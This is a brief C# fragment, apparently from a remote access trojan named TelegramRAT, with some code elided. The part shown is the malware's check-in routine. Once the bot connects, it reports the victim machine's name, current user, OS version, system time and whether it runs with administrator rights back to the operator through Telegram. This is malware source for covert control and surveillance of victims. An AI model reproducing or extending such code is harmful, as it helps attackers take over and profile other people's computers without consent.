...
namespace TelegramRAT
{
    internal class telegram
    {
        ...
        {
            sendText(
                "\n✅ Bot Sucessfully connected." +
                "\nConnected on machine name: " + Environment.MachineName +
                "\nCurrently on user: " + Environment.UserName +
                "\nOn OS: " + utils.GetSystemVersion() +
                "\nSystem time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") +
                "\nStarted with elivated permissions: " + utils.IsAdministrator() +
                "");
        }
